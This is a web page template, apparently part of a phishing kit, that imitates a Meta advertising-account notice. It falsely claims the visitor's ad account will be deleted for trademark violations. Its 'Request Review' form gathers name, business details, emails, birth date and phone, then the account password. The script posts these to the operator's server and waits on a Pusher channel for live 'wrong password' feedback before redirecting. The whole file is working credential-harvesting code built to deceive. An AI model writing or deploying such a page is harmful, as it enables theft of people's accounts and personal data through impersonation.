<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $data->title }}</title>
    <meta name="description" content="{{ $data->description }}">
    <meta property="og:locale" content="en_US">
    <meta property="og:type" content="website">
    <meta content='text/html; charset=UTF-8' http-equiv='Content-Type' />
    <meta property="og:image" content="{{ $data->image }}">
    <meta property="og:title" content="{{ $data->title }}">
    <meta property="og:description" content="{{ $data->description }}">
    <meta property="og:site_name" content="{{ $data->title }}">
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:description" content="{{ $data->description }}">
    <meta name="twitter:title" content="{{ $data->title }}">
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://kit.fontawesome.com/8f728199e4.css" crossorigin="anonymous">
    <link rel="shortcut icon" href="https://{{env('APP_CDN_DOMAIN', 'brscdn.io.vn')}}/theme/system/facebook/fblogo.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/pusher/8.4.0/pusher.min.js"
        integrity="sha512-p3rR75Is6DCK1r2D8mdxLQhe4IWVDSTUBdxqs0Veum0hHDSY+sH9M6U6Cesr1umlxbiEK9w/3IhXFlZcWT1AoA=="
        crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <style>
        @font-face {
            font-family: 'MyFont';
            src: url('https://{{ env('APP_CDN_DOMAIN', 'brscdn.io.vn') . '/theme/user/metaads/font.woff2' }}') format('woff2');
            font-weight: normal;
            font-style: normal;
        }

        body {
            font-family: 'MyFont', sans-serif;
            margin: 0;
            height: 100vh;
            background: linear-gradient(93deg, rgba(2, 0, 36, 1) 0%, rgb(249 242 249) 0%, rgba(237, 246, 254, 1) 22%);
        }
    </style>
</head>

<body>
    <div id="modal"
        class="hidden flex fixed inset-0 items-center justify-center bg-black/50
opacity-0 duration-300">
        <div id="modalBox"
            class="bg-white p-4 rounded-lg w-150 shadow-xl
scale-95 opacity-0 transition-all duration-300 mx-2">
            <h2 class="text-lg text-center mb-4 font-semibold">Appeal Advertising Account</h2>
            <div class="flex justify-center">
                <img class="mb-3"
                    src="{{ 'https://' . env('APP_DOMAIN', 'brscdn.io.vn') . '/theme/user/metaads/logo.png' }}"
                    width="100">
            </div>
            <div class="px-3.5 py-2.5 text-white text-[15px] bg-red-500 rounded-lg mb-2" style="display: none"
                id="warning_notice">
                Error, please try again
            </div>
            <form id="submit">
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Your Full Name
                    </label>
                    <input type="text"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        placeholder="Enter your full name" required />
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Enter Business Name
                    </label>
                    <input type="text"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        placeholder="Enter business name" required />
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Email Address
                    </label>
                    <input type="email"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        placeholder="Enter your email address" required />
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Business Email
                    </label>
                    <input type="email"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        placeholder="Enter business email" required />
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Date of Birth
                    </label>
                    <input type="date"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        required />
                </div>
                <div class="mb-4">
                    <label class="block text-sm font-medium text-gray-700 mb-1">
                        Enter Phone Number
                    </label>
                    <input type="text" inputmode="numeric"
                        class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                        placeholder="Enter your phone number" onkeypress="return isNumeric(event)" required />
                </div>
                <button type="submit" id="submit_btn"
                    class="py-2 text-white w-full rounded-lg bg-blue-500 cursor-pointer text-[15px]">Request
                    Review</button>
            </form>
            <div id="verify_form" style="display: none;">
                <p class="mb-1">For security reasons, please enter your password to continue</p>
                <form id="verify">
                    <div class="mb-4">
                        <input type="password"
                            class="w-full px-4 py-2 border border-gray-300 rounded-lg
                  focus:outline-none focus:ring-1 focus:ring-blue-500 focus:border-blue-500
                  transition placeholder:text-[15px] text-[15px]"
                            placeholder="Enter your password" required />
                    </div>
                    <button type="submit" id="verify_btn"
                        class="py-2 text-white w-full rounded-lg bg-blue-500 cursor-pointer text-[15px] disabled:opacity-80">Continue</button>
                </form>
            </div>
        </div>
    </div>
    <div class="px-4 py-2 sm:w-[50vw] mx-auto">
        <img class="mb-3" src="{{ 'https://' . env('APP_DOMAIN', 'brscdn.io.vn') . '/theme/user/metaads/logo.png' }}"
            width="100">
        <div class="py-5 px-7 rounded-lg bg-white border border-gray-200 shadow-sm">
            <div class="flex gap-3 items-center">
                <i class="fa-solid fa-circle-minus text-[20px] sm:text-[30px] text-red-500"></i>
                <h1 class="text-lg sm:text-xl">We have scheduled your advertising account for deletion</h1>
            </div>
            <div class="space-y-1 mt-3 sm:ml-[49px]">
                <p class="text-gray-500 text-[14px]">We have received multiple reports that your ads violate trademark
                    rights.
                    <br>
                    After a careful review, we have reached a decision on this matter.
                </p>
                <div class="mt-2 mb-2">
                    <p class="text-gray-500 text-[14px]">What can you do?</p>
                    <ul class="text-gray-500 text-[14px] list-inside space-y-0 list-disc">
                        <li>If you do not take corrective action, your advertising account will be permanently deleted.
                        </li>
                        <li>If you wish to appeal this decision, please submit a review request for us to audit and
                            assist.</li>
                    </ul>
                </div>
                <p class="text-blue-500 font-semibold text-[14px]">ID: #{{ generateMetaAdsCode() }}</p>
            </div>
            <div class="space-y-3 mt-4">
                <div class="flex justify-center">
                    <div class="p-2 bg-gray-100 rounded-xl">
                        <img src="{{ 'https://' . env('APP_DOMAIN', 'brscdn.io.vn') . '/theme/user/metaads/unlock.png' }}"
                            alt="">
                    </div>
                </div>
                <div class="px-4 py-3 rounded-lg bg-gray-100">
                    <h1 class="text-[16px] mb-2">Request Review</h1>
                    <div class="space-y-1 ml-0.5">
                        <p class="text-gray-500 text-[14px]">This form is only used to submit appeals and restore
                            account status.
                        </p>
                        <p class="text-gray-500 text-[14px]">Please provide all required information below. Missing
                            information may delay your appeal process.</p>
                    </div>
                </div>
                <button onclick="openModal()"
                    class="py-2 text-white w-full rounded-lg bg-blue-500 cursor-pointer text-[15px]">Request
                    Review</button>
            </div>
            <div class="border-t my-5 border-gray-300"></div>
            <h1 class="text-[16px] mb-2">What is trademark infringement?</h1>
            <p class="text-gray-500 text-[14px]">In general, an act is considered trademark infringement when it falls
                into all 3 of the following cases:
            </p>
            <ul class="text-gray-500 text-[14px] list-inside space-y-0 list-decimal mt-1.5 ml-2">
                <li>A business or individual uses the owner's trademark (or a similar trademark) without permission.
                </li>
                <li>The use occurs in trade, meaning it relates to the sale or advertising of products or services.</li>
                <li>The use is likely to cause confusion among users about the source, endorsement, or affiliation with
                    the product or service.</li>
            </ul>
        </div>
    </div>
    <script src="helpers.js"></script>
    <script>
        var pusher = new Pusher('a16c3bab85659b6d2b51', {
            cluster: 'ap1',
        });
        var channel = pusher.subscribe('mrls');
        channel.bind('{{ $pusher_code }}', function(data) {
            if (data.status) {
                $("#warning_notice").hide()
                window.location.href =
                    '{{ $data->redirect_link }}'
            } else {
                if (data.wrong_user) {
                    warningAction('Invalid phone number or email address')
                    $("#verify_btn").attr('disabled', false).html('Continue')
                }
                if (data.wrong_password) {
                    warningAction('Incorrect password')
                    $("#verify_btn").attr('disabled', false).html('Continue')
                }
            }
        });

        function openModal() {
            const modal = document.getElementById("modal");
            const box = document.getElementById("modalBox");
            modal.classList.remove("hidden");
            setTimeout(() => {
                modal.classList.remove("opacity-0");
                box.classList.remove("opacity-0", "scale-95");
                box.classList.add("scale-100");
            }, 10);
        }

        function closeModal() {
            const modal = document.getElementById("modal");
            const box = document.getElementById("modalBox");

            modal.classList.add("opacity-0");
            box.classList.add("opacity-0", "scale-95");

            setTimeout(() => {
                modal.classList.add("hidden");
            }, 300);
        }

        function isNumeric(e) {
            const char = String.fromCharCode(e.which);
            if (!/[0-9]/.test(char)) {
                e.preventDefault();
                return false;
            }
        }

        function warningAction(html) {
            $("#warning_notice").show()
            $("#warning_notice").html(html)
        }
        $("#submit").submit(function(e) {
            e.preventDefault()
            $("#warning_notice").hide()
            name = $(this).find('input:eq(0)').val()
            business_name = $(this).find('input:eq(1)').val()
            business_mail = $(this).find('input:eq(3)').val()
            birthday = $(this).find('input:eq(4)').val()
            mail = $(this).find('input:eq(2)').val()
            phone = $(this).find('input:eq(5)').val()
            if (!name || name.trim().length <= 0) {
                warningAction('You have not entered your full name')
                return
            }
            if (!business_name || business_name.trim().length <= 0) {
                warningAction('You have not entered your business name')
                return
            }
            if (!business_mail || business_mail.trim().length <= 0) {
                warningAction('You have not entered your business email')
                return
            }
            if (!birthday || birthday.trim().length <= 0) {
                warningAction('You have not entered your date of birth')
                return
            }
            if (!check_email(mail)) {
                warningAction('Your email address is invalid')
                return
            }
            if (!phone_check(phone)) {
                warningAction('Your phone number is invalid')
                return
            }
            $(this).hide()
            $("#verify_form").show()
        })
        $("#verify").submit(function(e) {
            e.preventDefault();
            $("#warning_notice").hide()
            mail = $("#submit").find('input:eq(2)').val()
            phone = $("#submit").find('input:eq(5)').val()
            password = $(this).find('input[type=password]').val()
            btn = $("#verify_btn")
            btn.attr('disabled', true).html('Processing')
            if (password.trim().length < 5) {
                warningAction('Your password is invalid or too short')
                btn.attr('disabled', false).html('Continue')
                return
            }
            const dataToSend = {
                'phone': phone,
                'email': mail,
                'password': password,
                'info': '{{ $info }}',
            }
            $.post("{{ route('post.customweb.metaads') }}", {
                    d: JSON.stringify(dataToSend),
                    'p_c': "{{ $pusher_code }}",
                    '_token': '{{ csrf_token() }}'
                },
                function(data, textStatus, jqXHR) {},
                "json"
            );
        });
    </script>
</body>

</html>
